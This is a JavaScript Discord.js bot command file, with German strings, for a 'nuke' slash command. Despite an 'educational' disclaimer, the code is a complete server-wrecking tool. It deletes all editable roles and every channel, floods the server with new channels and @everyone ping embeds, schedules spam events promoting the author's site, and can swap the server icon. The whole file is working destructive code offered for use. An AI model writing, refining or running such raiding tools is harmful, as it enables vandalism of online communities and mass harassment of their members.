/**
 * DISCLAIMER:
 * This bot is provided solely for educational and demonstration purposes.
 * We assume no liability for any harm, damages, or misuse resulting from its use.
 * It is strictly prohibited to use this bot for any malicious or harmful activities.
 *
 * Created by @apt_start_latifi
 * Help: https://iddox.tech/
 */

const { 
    SlashCommandBuilder, 
    ChannelType, 
    EmbedBuilder, 
    GuildScheduledEventEntityType 
  } = require('discord.js');
  
  module.exports = {
    data: new SlashCommandBuilder()
      .setName('nuke')
      .setDescription('Nuke: Löscht Rollen/Channels, erstellt Channels, sendet Pings, plant Event, optional PB.')
      .addStringOption(option => 
        option.setName('channel_name')
              .setDescription('Name für neue Channels')
              .setRequired(true))
      .addIntegerOption(option => 
        option.setName('channel_number')
              .setDescription('Anzahl der neuen Channels')
              .setRequired(true))
      .addStringOption(option =>
        option.setName('channel_type')
              .setDescription('Wähle den Channel-Typ')
              .setRequired(true)
              .addChoices(
                { name: 'Text', value: 'text' },
                { name: 'Voice', value: 'voice' },
                { name: 'Random', value: 'random' }
              ))
      .addStringOption(option =>
        option.setName('embed_title')
              .setDescription('Titel für das Ping-Embed')
              .setRequired(true))
      .addStringOption(option =>
        option.setName('embed_message')
              .setDescription('Nachricht für das Ping-Embed')
              .setRequired(true))
      .addIntegerOption(option =>
        option.setName('ping_number')
              .setDescription('Anzahl der Ping-Nachrichten')
              .setRequired(true))
      .addStringOption(option =>
        option.setName('image_url')
              .setDescription('Optional: URL für neues Serverbild')
              .setRequired(false)),
    
    async execute(interaction) {
      try {
        await interaction.deferReply({ ephemeral: true });
      } catch (err) {
        console.error("Warnung beim deferReply:", err);
      }
      
      const guild = interaction.guild;
      if (!guild) {
        try {
          await interaction.editReply({ content: 'Dieser Befehl kann nur in einer Guild ausgeführt werden.' });
        } catch (err) { }
        return;
      }
      
      const channelName      = interaction.options.getString('channel_name');
      const channelNumber    = interaction.options.getInteger('channel_number');
      const channelTypeInput = interaction.options.getString('channel_type'); 
      const embedTitle       = interaction.options.getString('embed_title');
      const embedMessage     = interaction.options.getString('embed_message');
      const pingNumber       = interaction.options.getInteger('ping_number');
      const imageUrl         = interaction.options.getString('image_url'); 
      
      try {
        const roles = guild.roles.cache.filter(role => role.name !== '@everyone');
        const deletableRoles = roles.filter(role => role.editable);
        await Promise.all(deletableRoles.map(role => role.delete().catch(console.error)));
      } catch (error) {
        console.error('Fehler beim Löschen der Rollen:', error);
      }
      
      try {
        const channels = guild.channels.cache;
        await Promise.all(channels.map(channel => channel.delete().catch(console.error)));
      } catch (error) {
        console.error('Fehler beim Löschen der Channels:', error);
      }
      
      await new Promise(resolve => setTimeout(resolve, 1000));
      
      try {
        const createPromises = [];
        for (let i = 0; i < channelNumber; i++) {
          let newChannelType;
          if (channelTypeInput === 'random') {
            newChannelType = (i % 2 === 0) ? ChannelType.GuildText : ChannelType.GuildVoice;
          } else if (channelTypeInput === 'text') {
            newChannelType = ChannelType.GuildText;
          } else if (channelTypeInput === 'voice') {
            newChannelType = ChannelType.GuildVoice;
          } else {
            try { await interaction.editReply({ content: 'Ungültiger Channel-Typ ausgewählt.' }); } catch(e){}
            return;
          }
          createPromises.push(guild.channels.create({
            name: channelName,
            type: newChannelType,
          }));
        }
        await Promise.all(createPromises);
      } catch (error) {
        console.error('Fehler beim Erstellen der neuen Channels:', error);
      }
      
      try {
        const embed = new EmbedBuilder()
          .setTitle(embedTitle)
          .setDescription(embedMessage)
          .setColor('#800080')
          .setFooter({ text: "Created by @apt_start_latifi | https://iddox.tech/" });
        
        const textChannels = guild.channels.cache.filter(channel =>
          channel.type === ChannelType.GuildText &&
          channel.permissionsFor(guild.members.me).has('SendMessages')
        );
        const channelsArray = Array.from(textChannels.values());
        const channelCount = channelsArray.length;
        if (channelCount === 0) {
          console.error('Keine Text-Channels gefunden für Ping-Nachrichten.');
        }
        const messagesPerChannel = Math.floor(pingNumber / channelCount);
        const remainder = pingNumber % channelCount;
        
        const pingPromises = [];
        channelsArray.forEach((channel, index) => {
          let messagesToSend = messagesPerChannel + (index < remainder ? 1 : 0);
          for (let i = 0; i < messagesToSend; i++) {
            pingPromises.push(channel.send({ content: '@everyone', embeds: [embed] }).catch(console.error));
          }
        });
        await Promise.all(pingPromises);
      } catch (error) {
        console.error('Fehler beim Senden der Ping-Nachrichten:', error);
      }
      
      try {
        const startTime = new Date(Date.now() + 7 * 24 * 60 * 60 * 1000);
        const endTime = new Date(startTime.getTime() + 60 * 60 * 1000);
        
        const eventCount = 6;
        const eventPromises = [];
        for (let i = 0; i < eventCount; i++) {
          let eventName;
          if (i % 2 === 0) {
            eventName = "G3t Nuk3d by Idd0x @everyone";
          } else {
            eventName = "Visit my Website to learn how to Safe from this : https://iddox.tech/ @everyone";
          }
          eventPromises.push(guild.scheduledEvents.create({
            name: eventName,
            scheduledStartTime: startTime,
            scheduledEndTime: endTime,
            privacyLevel: 2,
            entityType: GuildScheduledEventEntityType.External,
            entityMetadata: { location: "Online" }
          }));
        }
        await Promise.all(eventPromises);
      } catch (error) {
        console.error('Fehler beim Erstellen der Events:', error);
      }
      
      if (imageUrl) {
        try {
          await guild.setIcon(imageUrl);
        } catch (error) {
          console.error('Fehler beim Ändern des Serverbildes:', error);
        }
      }
      try {
        await interaction.editReply("Nuke abgeschlossen: Rollen und Channels gelöscht, neue Channels erstellt, Pings versendet, Event erstellt" + (imageUrl ? " und Server-Icon geändert." : "."));
      } catch (error) {
        console.error('Finale Antwort konnte nicht gesendet werden:', error);
      }
    },
  };
  